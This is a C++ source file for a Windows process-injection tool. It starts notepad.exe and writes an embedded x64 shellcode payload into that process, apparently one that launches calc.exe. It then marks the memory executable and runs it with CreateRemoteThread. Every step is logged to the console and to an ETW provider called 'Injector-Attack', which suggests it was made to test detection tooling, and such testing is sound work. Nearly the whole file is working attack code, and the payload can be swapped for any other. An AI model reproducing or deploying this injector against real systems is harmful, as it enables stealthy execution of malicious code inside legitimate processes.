#include <windows.h>
#include <iostream>
#include <iomanip>
#include <fstream>
#include <sstream>
#include <TraceLoggingProvider.h>


// paths
std::string outFile = "C:\\Users\\Public\\Downloads\\attack-output.csv";
LPCWSTR newProcessToInjectTo = L"C:\\Windows\\System32\\notepad.exe";

// my attack provider
TRACELOGGING_DEFINE_PROVIDER(
    g_hProvider,
    "Injector-Attack", // name in the ETW
    (0x72248466, 0x7166, 0x4feb, 0xa3, 0x86, 0x34, 0xd8, 0xf3, 0x5b, 0xb6, 0x37)  // a random GUID
);

int sleep_between_steps_ms = 200; // time to wait between attack steps


void print_and_emit_event(std::string msg) {
    TraceLoggingWrite(
        g_hProvider,
        "Injector Event", // this is the event name
		TraceLoggingValue(msg.c_str(), "message")
    );
    std::cout << msg << "\n";
}


int main(int argc, char** argv) {
    // start ETW provider
    TraceLoggingRegister(g_hProvider);

	enum StartupMode { NoWait, WaitTime, WaitForEnter };
	StartupMode s = WaitForEnter; // default mode
    int waitTime = 0;

    if (argc < 2) {
        s = WaitForEnter;
    }
    else if (strcmp(argv[1], "--no-wait") == 0) {
        s = NoWait;
    }
    else if (strcmp(argv[1], "--wait") == 0) {
        s = WaitTime;
        if (argc < 3) {
            waitTime = 10; // default wait time in sec
        }
        else {
            waitTime = strtol(argv[2], NULL, 10);
        }
    }

    std::ostringstream msg;

    // print current 
    msg << "[+] Injector started with PID " << GetCurrentProcessId();;
    print_and_emit_event(msg.str()); msg.str("");
	Sleep(sleep_between_steps_ms);

    switch (s) {
        case NoWait:
            break;
        case WaitTime:
            for (int i = waitTime; i > 0; i--) {
                std::cout << "[*] Starting injection in " << i << "\n";
                Sleep(1000);
            };
            break;
        case WaitForEnter:
            std::cout << "[*] Press ENTER to start injection...\n";
            std::cin.get();;
        default:
            break;
    }

	msg << "[<] Before starting subprocess to inject to";
    print_and_emit_event(msg.str()); msg.str("");

    // start new process to inject to
    STARTUPINFO si = { sizeof(si) };
    PROCESS_INFORMATION pi;
    if (!CreateProcess(newProcessToInjectTo, nullptr, nullptr, nullptr, FALSE, 0, nullptr, nullptr, &si, &pi)) {
        std::cerr << "[!] Failed to start process: " << GetLastError() << "\n";
        return 1;
    }

    msg << "[>]  After starting subprocess to inject to, PID: " << pi.dwProcessId;
    print_and_emit_event(msg.str()); msg.str("");
	Sleep(sleep_between_steps_ms);

	msg << "[<] Before opening process handle";
	print_and_emit_event(msg.str()); msg.str("");

    // open process with read/write access
    HANDLE hProcess = OpenProcess(PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_VM_WRITE, FALSE, pi.dwProcessId);
    if (!hProcess) {
        std::cerr << "[!] Failed to open process: " << GetLastError() << "\n";
        return 1;
    }

    msg << "[>]  After opening process handle";
    print_and_emit_event(msg.str()); msg.str("");
    Sleep(sleep_between_steps_ms);

	// byte array of value to write
    BYTE shellcode[] = { 0xFC, 0x48, 0x83, 0xE4, 0xF0, 0xE8, 0xC0, 0x00, 0x00, 0x00, 0x41, 0x51, 0x41, 0x50, 0x52, 0x51, 0x56, 0x48, 0x31, 0xD2, 0x65, 0x48, 0x8B, 0x52, 0x60, 0x48, 0x8B, 0x52, 0x18, 0x48, 0x8B, 0x52, 0x20, 0x48, 0x8B, 0x72, 0x50, 0x48, 0x0F, 0xB7, 0x4A, 0x4A, 0x4D, 0x31, 0xC9, 0x48, 0x31, 0xC0, 0xAC, 0x3C, 0x61, 0x7C, 0x02, 0x2C, 0x20, 0x41, 0xC1, 0xC9, 0x0D, 0x41, 0x01, 0xC1, 0xE2, 0xED, 0x52, 0x41, 0x51, 0x48, 0x8B, 0x52, 0x20, 0x8B, 0x42, 0x3C, 0x48, 0x01, 0xD0, 0x8B, 0x80, 0x88, 0x00, 0x00, 0x00, 0x48, 0x85, 0xC0, 0x74, 0x67, 0x48, 0x01, 0xD0, 0x50, 0x8B, 0x48, 0x18, 0x44, 0x8B, 0x40, 0x20, 0x49, 0x01, 0xD0, 0xE3, 0x56, 0x48, 0xFF, 0xC9, 0x41, 0x8B, 0x34, 0x88, 0x48, 0x01, 0xD6, 0x4D, 0x31, 0xC9, 0x48, 0x31, 0xC0, 0xAC, 0x41, 0xC1, 0xC9, 0x0D, 0x41, 0x01, 0xC1, 0x38, 0xE0, 0x75, 0xF1, 0x4C, 0x03, 0x4C, 0x24, 0x08, 0x45, 0x39, 0xD1, 0x75, 0xD8, 0x58, 0x44, 0x8B, 0x40, 0x24, 0x49, 0x01, 0xD0, 0x66, 0x41, 0x8B, 0x0C, 0x48, 0x44, 0x8B, 0x40, 0x1C, 0x49, 0x01, 0xD0, 0x41, 0x8B, 0x04, 0x88, 0x48, 0x01, 0xD0, 0x41, 0x58, 0x41, 0x58, 0x5E, 0x59, 0x5A, 0x41, 0x58, 0x41, 0x59, 0x41, 0x5A, 0x48, 0x83, 0xEC, 0x20, 0x41, 0x52, 0xFF, 0xE0, 0x58, 0x41, 0x59, 0x5A, 0x48, 0x8B, 0x12, 0xE9, 0x57, 0xFF, 0xFF, 0xFF, 0x5D, 0x48, 0xBA, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x8D, 0x8D, 0x01, 0x01, 0x00, 0x00, 0x41, 0xBA, 0x31, 0x8B, 0x6F, 0x87, 0xFF, 0xD5, 0xBB, 0xF0, 0xB5, 0xA2, 0x56, 0x41, 0xBA, 0xA6, 0x95, 0xBD, 0x9D, 0xFF, 0xD5, 0x48, 0x83, 0xC4, 0x28, 0x3C, 0x06, 0x7C, 0x0A, 0x80, 0xFB, 0xE0, 0x75, 0x05, 0xBB, 0x47, 0x13, 0x72, 0x6F, 0x6A, 0x00, 0x59, 0x41, 0x89, 0xDA, 0xFF, 0xD5, 0x63, 0x61, 0x6C, 0x63, 0x2E, 0x65, 0x78, 0x65, 0x00};

    msg << "[<] Before allocating memory for shellcode";
    print_and_emit_event(msg.str()); msg.str("");

    // allocate memory to new process
    LPVOID remote_addr = VirtualAllocEx(hProcess, nullptr, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (remote_addr) {
        msg << "[>]  After allocating memory for shellcode, at: " << remote_addr;
        print_and_emit_event(msg.str()); msg.str("");
		Sleep(sleep_between_steps_ms);
    }
    else {
        std::cerr << "[!] Failed to allocate memory: " << GetLastError() << "\n";
        return 1;
    }

    msg << "[<] Before writing shellcode to process";
    print_and_emit_event(msg.str()); msg.str("");

    // write value into process' memory
    SIZE_T bytes_written;
    if (WriteProcessMemory(hProcess, remote_addr, &shellcode, sizeof(shellcode), &bytes_written)) {
        msg << "[>]  After writing shellcode to process, at: " << remote_addr;
        print_and_emit_event(msg.str()); msg.str("");
        Sleep(sleep_between_steps_ms);
    }
    else {
        std::cerr << "[!] Failed to write memory: " << GetLastError() << "\n";
        return 1;
    }

    msg << "[<] Before changing memory protection to PAGE_EXECUTE_READ";
    print_and_emit_event(msg.str()); msg.str("");

	// change memory protection to executable
    DWORD old_protect;
    if (VirtualProtectEx(hProcess, remote_addr, sizeof(shellcode), PAGE_EXECUTE_READ, &old_protect)) {
        msg << "[>]  After changing memory protection to PAGE_EXECUTE_READ";
        print_and_emit_event(msg.str()); msg.str("");
		Sleep(sleep_between_steps_ms);
    }
    else {
        std::cerr << "[!] Failed to change memory protection: " << GetLastError() << "\n";
        VirtualFreeEx(hProcess, remote_addr, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return 1;
    }

    msg << "[<] Before creating remote thread";
    print_and_emit_event(msg.str()); msg.str("");

	// call create remote thread
    HANDLE hThread = CreateRemoteThread(hProcess, nullptr, 0, (LPTHREAD_START_ROUTINE)remote_addr, nullptr, 0, nullptr);
    if (hThread) {
        msg << "[>]  After creating remote thread";
        print_and_emit_event(msg.str()); msg.str("");
		Sleep(sleep_between_steps_ms);
    }
    else {
        std::cerr << "[!] Failed to create remote thread: " << GetLastError() << "\n";
        return 1;
	}

    TraceLoggingUnregister(g_hProvider);
    return 0;
}
